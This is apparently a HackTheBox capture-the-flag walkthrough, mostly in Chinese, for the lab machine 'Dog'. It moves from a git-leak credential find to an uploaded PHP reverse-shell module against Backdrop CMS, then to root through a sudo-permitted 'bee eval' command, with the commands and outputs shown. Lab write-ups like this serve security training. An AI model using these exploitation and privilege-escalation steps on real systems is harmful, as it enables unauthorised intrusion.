---
title: 'HackTheBox: Dog'
disqus: hackmd
---

HackTheBox: Dog
===

## Topic

### Lab
- HackTheBox: \
https://app.hackthebox.com/machines/Dog

### Initial Enumeration

● Start Machine: `10.10.11.58`\
![image](https://hackmd.io/_uploads/H1BTUK1Jex.png)

```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -Pn 10.10.11.58
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-18 03:59 EDT
Nmap scan report for 10.10.11.58
Host is up (0.47s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.22 seconds

```
> SSH, HTTP

瀏覽 http://10.10.11.58/ \
![image](https://hackmd.io/_uploads/rkGrPt1Jxe.png)
> 有 login 路徑： http://10.10.11.58/?q=user/login\
> ![image](https://hackmd.io/_uploads/rkUm_FkJel.png)

瀏覽 http://10.10.11.58/robots.txt \
![image](https://hackmd.io/_uploads/HJOT5tyJgl.png)

測試了一下 Sqli: `http://10.10.11.58/?q=chw%27--%20#`
![image](https://hackmd.io/_uploads/SyIVotyyll.png)
> 無效


## Solution

### 1. git_dumper
先從 `git leak` 看起
```
┌──(chw㉿CHW)-[~/Tools/git-dumper]
└─$ python3 git_dumper.py http://10.10.11.58/.git/ Dog
/home/chw/Tools/git-dumper/git_dumper.py:409: SyntaxWarning: invalid escape sequence '\g'
  modified_content = re.sub(UNSAFE, '# \g<0>', content, flags=re.IGNORECASE)
[-] Testing http://10.10.11.58/.git/HEAD [200]
[-] Testing http://10.10.11.58/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://10.10.11.58/.git/ [200]
[-] Fetching http://10.10.11.58/.gitignore [404]
[-] http://10.10.11.58/.gitignore responded with status code 404
[-] Fetching http://10.10.11.58/.git/objects/ [200]
...
```
vscode 查看 git leak file\
![image](https://hackmd.io/_uploads/ry6FcF1yxl.png)

#### 1.1 `./setting.php`
```
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
...
$config_directories['active'] = './files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active';
$config_directories['staging'] = './files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/staging';
...
$settings['hash_salt'] = 'aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ';
```
> `root`:`BackDropJ2024DS2024`
> > 無法使用 mysql 帳號登入 CMS\
> > ![image](https://hackmd.io/_uploads/Bk0W32k1xx.png)

#### 1.2 `./core/profiles/standard/standard.info`
```
project = backdrop
version = 1.27.1
timestamp = 1709862662
```
> ver: 1.27.1

#### 1.3 pwd & other plugin
```
┌──(chw㉿CHW)-[~/Tools/git-dumper/Dog]
└─$ grep -riE 'password|pwd|version' . 
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/system.core.json:    "jquery_version": "default",
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/system.core.json:    "user_password_reject_weak": false,
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/system.core.json:    "user_password_strength_threshold": 50,
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/system.core.json:    "user_password_reset_timeout": 86400,
...
```
> 沒有看到厲害的東西

### 2. Searchsploit
```
┌──(chw㉿CHW)-[~/Tools/git-dumper/Dog]
└─$ searchsploit backdrop 1.27
----------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                   |  Path
----------------------------------------------------------------------------------------------------------------- ---------------------------------
Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)                                               | php/webapps/52021.py
----------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(chw㉿CHW)-[~/Tools/git-dumper/Dog]
└─$ python3 52021.py http://10.10.11.58
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58/modules/shell/shell.php
                                                                                                                                                    
┌──(chw㉿CHW)-[~/Tools/git-dumper/Dog]
└─$ curl -v http://10.10.11.58/admin/modules/install  

*   Trying 10.10.11.58:80...
* Connected to 10.10.11.58 (10.10.11.58) port 80
* using HTTP/1.x
> GET /admin/modules/install HTTP/1.1
> Host: 10.10.11.58
> User-Agent: curl/8.13.0-rc3
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 404 Not Found
< Date: Fri, 18 Apr 2025 13:48:50 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 273
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.10.11.58 Port 80</address>
</body></html>
* Connection #0 to host 10.10.11.58 left intact

```
> Exoploit 失敗 ，猜測路徑權限有鎖🔒\
> (打算先放著，等沒想法再回來解決)

### 3. 尋找 user
```
┌──(chw㉿CHW)-[~/Tools/git-dumper/Dog]
└─$ grep -riE 'dogBackDropSystem' . 

┌──(chw㉿CHW)-[~/Tools/git-dumper/Dog]
└─$ grep -riE 'Anonymous' .  
```
> 沒有可用資訊

在 Reset password 中發現，需要使用 Username 或 Email\
![image](https://hackmd.io/_uploads/B1X86n1yle.png)
> 利用 `@` 搜尋
```
┌──(chw㉿CHW)-[~/Tools/git-dumper/Dog]
└─$ grep -riE '@' . 
┌──(chw㉿CHW)-[~/Tools/git-dumper/Dog]
└─$ grep -riE '@dog.htb' . 
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
./.git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000  commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
./.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases

```
> 嘗試：
> 1. `dog@dog.htb`:`BackDropJ2024DS2024`
> 2. `tiffany@dog.htb`: `BackDropJ2024DS2024` (成功)\
> ![image](https://hackmd.io/_uploads/SJtCC2kJgl.png)

### 4. Enumerate CMS
- Manage user accounts: http://10.10.11.58/?q=admin/people/list \
![image](https://hackmd.io/_uploads/ByJybpJ1lg.png)

- Content: http://10.10.11.58/?q=admin/content \
![image](https://hackmd.io/_uploads/H1K7-6kyll.png)

- Content > MANAGE FILES: http://10.10.11.58/?q=admin/content/files \
![image](https://hackmd.io/_uploads/BJ-c-6Jkll.png)
> 看到透過 Exploit 上傳的 `shell.tar.gz`
> > 有個 Add a file buttom

### 5. Upload Web Shell
透過 Add a file 上傳 Reverse Shell\
> 但上傳只接受 `jpg jpeg gif png txt doc docx xls xlsx pdf ppt pptx pps ppsx odt ods odp mp3 mov mp4 m4a m4v mpeg avi ogg oga ogv weba webp webm`

回去看 Exploit
```
┌──(chw㉿CHW)-[~/Tools/git-dumper/Dog]
└─$ python3 52021.py http://10.10.11.58               
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58/modules/shell/shell.php
```
應該是要到 `http://10.10.11.58/admin/modules/install` 手動上傳 `shell.zip`
> 本題的路徑是： `http://10.10.11.58/?q=admin/installer/manual`

#### 5.1 修改 Exploit file
Exploit 使用 `$_GET['cmd']`\
將 `shell.php` 修改成直接建立 Reverse Shell
(可參考：[pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php))
```
┌──(chw㉿CHW)-[~/Tools/git-dumper/Dog]
└─$ tree shell/
shell/
├── shell.info
└── shell.php
```
![image](https://hackmd.io/_uploads/H1vgeRJkgg.png)

Manual installation 只接受 `.tar.gz`\
![image](https://hackmd.io/_uploads/Hku7lC1Jxl.png)
#### 5.2 壓縮文件
```
┌──(chw㉿CHW)-[~/Tools/git-dumper/Dog]
└─$ tar -cvzf shell.tar.gz shell/
shell/
shell/shell.php
shell/shell.info
```
開啟監聽 port
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888            
listening on [any] 8888 ...

```

#### 5.3 上傳 tar.gz
![image](https://hackmd.io/_uploads/r1K0TaJkel.png)\
瀏覽 `10.10.11.58/modules/shell/shell.php`

```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...

connect to [10.10.14.70] from (UNKNOWN) [10.10.11.58] 52970
Linux dog 5.4.0-208-generic #228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 13:17:16 up  3:13,  0 users,  load average: 0.09, 0.03, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ $ whoami
www-data
$ cd /home
$ ls
jobert
johncusack
$ cat jobert/user.txt
cat: jobert/user.txt: No such file or directory
$ cat johncusack/user.txt               
cat: johncusack/user.txt: Permission denied
```
嘗試使用 `johncusack`身份：
> `johncusack`: `BackDropJ2024DS2024`\
> 成功登入 ?!!
```
$ su johncusack
Password: BackDropJ2024DS2024

whoami
johncusack

```

### ✅ Get User Flag
> 在 `/home/johncusack` 找到 User flag

## Privileges Escalation

### 6. Sudo -l
```
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
```
改成 SSH 登入：
```
┌──(chw㉿CHW)-[~]
└─$ ssh johncusack@10.10.11.58
...
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee

```

### 7. `/usr/local/bin/bee`
```
johncusack@dog:~$ sudo /usr/local/bin/bee
🐝 Bee
Usage: bee [global-options] <command> [options] [arguments]

Global Options:
 --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.

 --site
 Specify the directory name or URL of the Backdrop site to use (as defined in 'sites.php'). If not set, will try to find the Backdrop site automatically based on the current directory.

 --base-url
 Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.

 --yes, -y
 Answer 'yes' to questions without prompting.

 --debug, -d
 Enables 'debug' mode, in which 'debug' and 'log' type messages will be displayed (in addition to all other messages).


Commands:
 CONFIGURATION
  config-export
   cex, bcex
   Export config from the site.
   ...
```
嘗試寫入 php 
```
johncusack@dog:~$ cat chw.php 
<?php system("/bin/bash"); ?>

johncusack@dog:~$ sudo /usr/local/bin/bee php-script chw.php

 ✘  The required bootstrap level for 'php-script' is not ready.
```
> bee 找不到對應的 Backdrop CMS 安裝目錄，預設要 bootstrap 一個 Backdrop 環境才能執行 PHP。

指定 CMS 安裝目錄: `/var/www/html`
```
johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval 'system("/bin/bash");'
root@dog:/var/www/html# whoami
root
```

### ✅ Get Root FLAG
![image](https://hackmd.io/_uploads/r11gwA1kll.png)


###### tags: `HTB` `Web` `CTF` `CMS`
